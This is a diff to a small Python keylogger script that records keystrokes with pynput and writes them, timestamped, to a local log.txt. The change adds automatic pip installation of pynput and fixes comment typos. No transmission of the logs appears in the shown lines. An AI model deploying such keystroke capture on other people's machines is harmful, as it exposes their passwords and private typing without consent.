@@ -1,15 +1,25 @@
-import pynput
+import subprocess
+import sys
+
+# Automatically install pynput if not installed
+try:
+    import pynput
+except ImportError:
+    print("pynput not found. Installing...")
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
+    import pynput  # Import again after installation
+
 from pynput.keyboard import Key, Listener
 from datetime import datetime
 
 # Variable Array
 ReKey = []
 
-# Open txt file while clear all the content
+# Open txt file while clearing all the content
 with open('log.txt', 'w') as f:
     pass  
 
-# Add pressed key into the recored key everytime 
+# Add pressed key into the recored key every time
 def PressEve(key):
     try:
         ReKey.append(key.char)
@@ -22,7 +32,7 @@ def PressEve(key):
         else:
             ReKey.append(str(key))
 
-# Creating time which align witht he machine
+# Creating time which aligns with the machine
 def log_keys(keys):
     now = datetime.now()
     time_str = now.strftime('%H:%M:%S')
